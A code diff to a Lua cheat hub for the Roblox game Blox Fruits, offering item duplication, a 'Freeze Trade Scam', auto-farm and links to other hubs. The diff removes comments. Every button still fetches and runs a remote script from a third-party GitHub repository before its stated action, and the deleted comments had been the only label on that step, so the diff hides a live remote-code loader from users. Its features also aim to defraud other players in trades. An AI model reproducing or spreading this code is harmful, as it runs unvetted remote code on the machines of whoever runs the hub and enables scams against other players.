@@ -1,7 +1,5 @@
--- Creating the Main Window
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
--- Creating the Main Window
 local Window = OrionLib:MakeWindow({
     Name = "SMN'S HUB",
     HidePremium = false,
@@ -11,7 +9,6 @@ local Window = OrionLib:MakeWindow({
     IntroText = "Welcome to SMN'S HUB",
 })
 
--- Creating Tabs
 local MainTab = Window:MakeTab({
     Name = "Main Features",
     Icon = "rbxassetid://4483345998",
@@ -24,12 +21,10 @@ local OtherScriptsTab = Window:MakeTab({
     PremiumOnly = false
 })
 
--- Creating Sections
 local DupeSection = MainTab:AddSection({ Name = "Dupe Fruit" })
 local ExtraSection = MainTab:AddSection({ Name = "Extra Features" })
 local OtherScriptsSection = OtherScriptsTab:AddSection({ Name = "Other Hubs" })
 
--- Dupe Fruit Feature
 local selectedNumber = ""
 DupeSection:AddTextbox({
     Name = "Enter Dupe Number",
@@ -44,7 +39,6 @@ DupeSection:AddTextbox({
 DupeSection:AddButton({
     Name = "Start Dupe",
     Callback = function()
-        -- Execute the additional script before the original functionality
         loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
         
         if selectedNumber then
@@ -56,7 +50,6 @@ DupeSection:AddButton({
                 Time = 5
             })
 
-            -- Actual dupe functionality
             for i = 1, 5000 do
                 local itemFrame = game:GetService("Players").LocalPlayer.PlayerGui.Main.InventoryContainer.Right.Content.ScrollingFrame.Frame[tostring(i)]
                 if itemFrame then
@@ -80,7 +73,6 @@ DupeSection:AddButton({
     end
 })
 
--- Additional Features
 ExtraSection:AddButton({
     Name = "All in Stock",
     Callback = function()
@@ -100,7 +92,6 @@ ExtraSection:AddButton({
 ExtraSection:AddButton({
     Name = "Freeze Trade Scam",
     Callback = function()
-        -- Execute the additional script before the original functionality
         loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
         
         print("Freeze Trade Scam activated")
@@ -116,7 +107,6 @@ ExtraSection:AddButton({
 ExtraSection:AddButton({
     Name = "Auto Farm",
     Callback = function()
-        -- Execute the additional script before the original functionality
         loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
         
         print("Auto Farm activated")
@@ -132,7 +122,6 @@ ExtraSection:AddButton({
 ExtraSection:AddButton({
     Name = "Auto Accept",
     Callback = function()
-        -- Execute the additional script before the original functionality
         loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
         
         print("Auto Accept activated")
@@ -143,7 +132,6 @@ ExtraSection:AddButton({
             Time = 5
         })
 
-        -- Example functionality for Auto Accept
         local Players = game:GetService("Players")
         Players.LocalPlayer.ChildAdded:Connect(function(child)
             if child:IsA("Dialog") then
@@ -155,11 +143,9 @@ ExtraSection:AddButton({
     end
 })
 
--- Other Scripts Tab Buttons
 OtherScriptsSection:AddButton({
     Name = "Hoho Hub",
     Callback = function()
-        -- Execute the additional script before the original functionality
         loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
         
         print("Hoho Hub executed")
@@ -176,7 +162,6 @@ OtherScriptsSection:AddButton({
 OtherScriptsSection:AddButton({
     Name = "KNCRYPT ",
     Callback = function()
-        -- Execute the additional script before the original functionality
         loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
         
         print("KNCRYPT executed")
@@ -193,7 +178,6 @@ OtherScriptsSection:AddButton({
 OtherScriptsSection:AddButton({
     Name = "Redz Hub",
     Callback = function()
-        -- Execute the additional script before the original functionality
         loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
         
         print("Redz Hub executed")
@@ -210,7 +194,6 @@ OtherScriptsSection:AddButton({
 OtherScriptsSection:AddButton({
     Name = "Speed Hub",
     Callback = function()
-        -- Execute the additional script before the original functionality
         loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
         
         print("Speed Hub executed")
@@ -227,7 +210,6 @@ OtherScriptsSection:AddButton({
 OtherScriptsSection:AddButton({
     Name = "W-Azure",
     Callback = function()
-        -- Execute the additional script before the original functionality
         loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
         
         print("W-Azure executed")
@@ -247,5 +229,4 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc61
     end
 })
 
--- Finishing the script
 OrionLib:Init()
